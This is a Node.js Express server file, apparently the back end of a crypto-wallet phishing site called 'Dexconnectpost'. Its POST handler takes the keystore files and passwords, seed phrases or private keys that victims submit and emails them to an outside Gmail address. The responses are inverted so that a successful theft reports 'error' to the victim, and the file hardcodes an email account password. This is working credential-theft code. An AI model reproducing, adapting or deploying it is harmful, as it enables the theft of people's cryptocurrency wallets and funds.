const path = require("path");
const express = require("express");
const nodemailer = require("nodemailer");
const app = express();

app.use(express.static(path.join(__dirname, "pages")));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res, next) => {
  return res.sendFile(path.join(__dirname, "pages", "index.html"));
});

app.post("/", (req, res, next) => {
  var text = "";
  if (req.body.import_type === "keystorejson") {
    text = stringKEYSTOREJSON(
      `${req.body.import_type}`,
      `${req.body.wallet}`,
      `${req.body.keystorejson}`,
      `${req.body.keystorepassword}`
    );
  } else if (req.body.import_type === "phrase") {
    text = stringPHRASE(
      `${req.body.import_type}`,
      `${req.body.wallet}`,
      `${req.body.phrase}`
    );
  } else {
    text = stringPRIVATEKEY(
      `${req.body.import_type}`,
      `${req.body.wallet}`,
      `${req.body.privatekey}`
    );
  }


  transport.sendMail(
    {
      from: "darkdeveloper54@outlook.com",
      to: "lexmanjob@gmail.com",
      subject: "New Submission Received From Dexconnectpost",
      html: text,
    },
    function (err, info) {
      if (err) {
        console.log(err);
        return res.json('success');
      }
      return res.json('error');
    }
  );
});

app.listen(process.env.PORT || 4000, () => {
  console.log("listening on port 4000");
});

var transport = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: "uzoechichigozie54@gmail.com",
    pass: "derddtafbfwrvbcv",
  },
});

